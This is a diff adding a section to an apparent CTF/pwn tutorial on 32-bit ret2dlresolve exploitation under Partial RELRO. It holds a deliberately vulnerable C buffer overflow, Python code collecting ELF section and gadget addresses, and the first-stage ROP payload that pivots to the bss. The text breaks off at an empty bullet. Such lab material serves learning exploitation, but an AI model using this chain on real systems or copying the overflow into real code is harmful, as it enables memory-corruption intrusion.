@@ -272,6 +272,83 @@ The idea is to crate a fake link_map struct use by the dl for resolve symbols. I
 
 #### Partial RELRO
 
+Vuln code with control eip at 28:
+
+```c
+int main(void)
+{
+  char buffer[24];
+  read(0, buffer, 0x64);
+  return ;
+}
+```
+
+Follow the [payload](/pwn/payload/payload_ret2dlresolve_32bit_partialRELRO.py).
+
+- First it get every addresses sections:
+
+```py
+# code
+addr_dynsym     = elf.get_section_by_name('.dynsym').header['sh_addr']
+addr_dynstr     = elf.get_section_by_name('.dynstr').header['sh_addr']
+addr_relplt     = elf.get_section_by_name('.rel.plt').header['sh_addr']
+addr_plt        = elf.get_section_by_name('.plt').header['sh_addr']
+addr_bss        = elf.get_section_by_name('.bss').header['sh_addr']
+addr_plt_read   = elf.plt['read']
+addr_got_read   = elf.got['read']
+```
+
+*You can print every section of your programm on gdb-gef with `info file`*
+
+```py
+#output
+[*] Section Headers
+[*] .dynsym  : 0x80481cc
+[*] .dynstr  : 0x804821c
+[*] .rel.plt : 0x8048298
+[*] .plt     : 0x80482d0
+[*] .bss     : 0x804a020
+[*] read@plt : 0x80482e0
+[*] read@got : 0x804a00c
+```
+
+- Load [some gadget](/tools/RopGadget.md) (addapt it to your code)
+
+```py
+# Gadget
+addr_pop3 = 0x080484b9 # pop esi, pop edi, pop ebp, ret
+addr_pop_ebp = 0x080484bb # pop ebp, ret
+addr_leave_ret = 0x08048398 # leave, ret
+```
+
+- control eip to call a `read(0, addr_bss+0x300, 100);` and write our fake struct inside the bss section.
+
+Why in bss ? bss is a section where data unitialized are stored. There is a anmout of place fill with zero in a read-write section. What is better ? 
+
+```py
+stack_size = 0x300
+base_stage = addr_bss + stack_size
+ 
+#read(0,base_stage,100)
+#jmp base_stage
+buf1 = b'A'* (28)
+buf1 += p32(addr_plt_read)
+buf1 += p32(addr_pop3)
+buf1 += p32(0)
+buf1 += p32(base_stage)
+buf1 += p32(100)
+buf1 += p32(addr_pop_ebp)
+buf1 += p32(base_stage)
+buf1 += p32(addr_leave_ret)
+```
+
+Is stack size use as a padding ? maybe ? 
+
+- So the buffer is fill with the offset, and we overwrite eip to read@plt (read function).
+- return address push on the stack
+- read argument push on the stack `read(0,base_stage,100) // read(stdin, buffer, size_read)`
+- 
+
 ### Documentation
 
 - [Amazing videos of Chris Kanich](https://www.youtube.com/watch?v=Ss2e6JauS0Y)
